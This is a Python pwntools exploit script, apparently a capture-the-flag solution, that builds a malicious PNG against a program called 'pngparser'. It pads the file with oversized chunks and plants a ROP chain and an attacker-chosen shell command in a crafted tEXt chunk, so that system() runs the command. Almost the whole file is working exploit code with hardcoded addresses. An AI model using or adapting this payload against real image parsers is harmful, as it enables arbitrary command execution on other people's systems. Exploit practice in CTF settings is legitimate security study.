#!/usr/bin/env python
# ./exp.py exp.png [cmd] && ./pngparser exp.png
from pwn import *
import sys, struct, binascii

elf = ELF('pngparser')

def header(bytes): 
    return struct.unpack('>NNccccc', bytes)

def parse(bytes): 
    signature = bytes[:8]
    bytes = bytes[8:]

    while bytes: 
        length = struct.unpack('>I', bytes[:4])[0]
        bytes = bytes[4:]

        chunk_type = bytes[:4]
        bytes = bytes[4:]

        chunk_data = bytes[:length]
        bytes = bytes[length:]

        bytes = bytes[4:]

        print length, chunk_type, len(chunk_data)#, repr(crc)
        yield chunk_type, chunk_data

def chunk(chunk_type, chunk_data): 
    length = struct.pack('>I', len(chunk_data))
    c = binascii.crc32(chunk_type + chunk_data) & 0xffffffff
    crc = struct.pack('>I', c)
    print len(chunk_data), chunk_type, len(chunk_data), c
    return length + chunk_type + chunk_data + crc

def main(): 
    name = sys.argv[1]
    with open(name, 'rb') as f: 
        bytes = f.read()

    buf = bytes[:8]
    for a, b in parse(bytes):
        if a == "IEND":
            buf += chunk("aaaa", "a"*0x1000)
            buf += chunk("aaaa", "a"*0x1000)

            g_buf = 0x804e4de

            rop = flat('a'*0x18, elf.sym['system'], 0x1234, g_buf+90)
            exp = 'a'*186 + p32(0) + p32(0x0804e800)
            exp += rop.ljust(96, 'a') + p32(g_buf - 0x40)
            exp += '\x00'*(0x1000-len(exp))
            buf += chunk("aaaa", exp) 

            cop = 'aaaaaa\x02a'+ p32(0x0804e801) + p32(0x0804b7b8) + 'a'*70 + p32(g_buf+12-0x20)
            cop += cmd
            cop += cyclic(0x1000-len(cop))
            buf += chunk("tEXt", 'a\x00' + cop)
            for i in range(17):
                buf += chunk("aaaa", "a"*0x1000)
        buf += chunk(a, b)

    with open("evil.png",'wb') as f:
        f.write(buf[:0x17051])

if __name__ == '__main__': 
    if len(sys.argv) < 3:
        cmd = 'ls -al' + ';'
    else:
        cmd = sys.argv[2] + ';'
    main()
